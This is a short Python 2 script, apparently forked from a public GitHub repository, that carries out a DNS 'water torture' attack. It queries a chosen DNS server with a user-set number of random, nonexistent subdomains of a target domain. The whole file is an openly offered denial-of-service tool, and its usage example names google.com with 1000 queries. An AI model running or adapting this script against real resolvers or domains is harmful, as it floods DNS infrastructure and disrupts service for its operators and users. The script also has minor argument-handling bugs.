#!/usr/bin/python
#Author : Antonio Taboada
#Date: 12/10/2016
#Filename: subdominio.py
#Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
#From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 
#-- Forked by Christopher Gray
# Date: 4/20/18 - Version 0.0.6

import dns.resolver
import random
import sys
import socket

print(sys.argv)

if len(sys.argv) <= 1:
    #print "Using: " , sys.argv[1] , " for domain "
    print "Please add DNS server, Domain, and Num Times, you want to query against. \r\n \r\n"
    print "Example: python attack_dns_nxdomain.py 192.168.1.2 google.com 1000 \r\n \r\n"
    exit(0)
elif len(sys.argv) >= 2:
    if sys.argv[1]:
        dns.resolver.nameservers = [sys.argv[1]]
    else:
        # 8.8.8.8 is Google's public DNS server
        dns.resolver.nameservers = ['8.8.8.8']

    if sys.argv[2]:
        dominio = sys.argv[2]
    else:
        dominio = 'google.com'

    if len(sys.argv) >= 3:
        NumTimes = int(sys.argv[3])
    else:
        NumTimes = 10

    try:
        host=socket.gethostbyname(dominio)
    except:
        print "Domain not valid"
        exit(0)

    print "Domain:", dominio, " \r\n "
    print "IP for Domain:", host, " \r\n "
        
    for x in range(0, NumTimes):
        print "We're on time %d \r\n \r\n" % (x)
        try:
            subdominio = str(random.randrange(10000000))
            url = subdominio+"."+dominio
            print "SubDomain:", url
            #r = dns.resolver.query('example.org', 'a')
            answers = dns.resolver.query(url)
            for rdata in answers: 
                print "IP SubDomain:", rdata
        except:
           print "Some other subdomain issue \r\n" 

